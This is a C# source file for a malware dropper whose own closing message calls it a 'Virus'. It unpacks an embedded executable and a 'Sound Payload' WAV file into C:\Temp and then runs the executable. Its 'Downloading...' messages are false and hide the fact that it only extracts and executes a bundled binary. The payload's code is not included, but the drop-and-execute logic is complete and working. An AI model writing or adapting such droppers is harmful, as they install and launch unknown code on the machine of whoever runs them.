using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MagniumInteriumDownloader
{
    class Program
    {
        static void Sleep(int msec)
        {
            Thread.Sleep(msec);
        }
        static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        static void Main(string[] args)
        {
            Console.Write("Downloading Magnium Interium...");
            Extract("MagniumInteriumDownloader", @"C:\Temp", "Resources", "MagniumInterium.exe");
            Sleep(1000);
            Console.Write("Downloading Sound Payload....");
            Extract("MagniumInteriumDownloader", @"C:\Temp", "Resources", "AboutU.wav");
            Sleep(2500);
            Console.WriteLine("Downloading is Complete!!! Enjoy to test my Virus :D");
            Sleep(5000);
            if (File.Exists(@"C:\Temp\MagniumInterium.exe"))
            {
                Process.Start(@"C:\Temp\MagniumInterium.exe");
            }
        }
    }
}
